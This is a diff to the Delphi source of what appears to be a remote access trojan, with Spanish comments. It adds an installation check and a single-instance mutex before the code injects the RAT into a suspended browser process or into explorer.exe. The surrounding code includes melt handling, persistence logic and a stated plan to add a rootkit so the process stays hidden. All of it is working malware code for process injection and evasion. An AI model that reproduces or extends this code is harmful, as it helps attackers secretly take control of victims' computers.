@@ -16,6 +16,8 @@ var
   HandleWindow: THandle;
   Browser: string;
   Instalado: Boolean;
+  Mut: string;
+  Mutex: THandle;
 begin
   CompartirConfig(); //compartimos la configuración en memoria para que conectador.dll la lea
   if ParamStr(1) = '\melt' then //Melt
@@ -39,9 +41,23 @@ begin
       //Lo malo de esto es que al esperar salimos listados en la lista de procesos, en el futuro habria que agregar un pequeño rootkit
 
       PID := GetProcessID('explorer.exe');
+      if lc(ParamStr(0)) = lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
+        Instalado := True
+      else
+        Instalado := False;
 
-      if (not Configuracion.bPersistencia) or (PID = 0) then
-        begin //como no está activada la persistencia o no esta ejecutandose explorer.exe yo me tengo que encargar de inyectar el rat
+
+
+      if (not Configuracion.bPersistencia) or (PID = 0) or (Instalado=false) then
+        begin
+        //como no está activada la persistencia, no estamos instalados o no esta ejecutandose explorer.exe yo me tengo que encargar de inyectar el rat
+          if not instalado then
+          begin
+            Mut := Configuracion.sPluginName;
+            Mutex := CreateMutex(nil, True, Pchar(Mut));
+            if (Mutex = 0) or (GetLastError <> 0) then exitprocess(0);
+            ReleaseMutex(Mutex);
+          end;
           ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
           StartInfo.cb := SizeOf(TStartupInfo);
           CreateProcess(PChar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
@@ -51,17 +67,15 @@ begin
         end
       else
         begin
-
-          if lc(ParamStr(0)) = lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
-            Instalado := True
-          else
-            Instalado := False;
-
+          Mut := Configuracion.sPluginName;
+          Mutex := CreateMutex(nil, True, Pchar(Mut));
+          if (Mutex = 0) or (GetLastError <> 0) then exitprocess(0);
+          ReleaseMutex(Mutex);
           Browser := GetBrowser;
           if not fileexists(Browser) then //si no existe el archivo del navegador predeterminado salimos
             exitprocess(0);
           HandleWindow := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
-          InyectarMonitor(HandleWindow, Browser, Instalado); //Si no estamos instalados hacemos que solo nos ejecute una vez
+          InyectarMonitor(HandleWindow, Browser); //Si no estamos instalados hacemos que solo nos ejecute una vez
           ExitProcess(0);
         end;
 
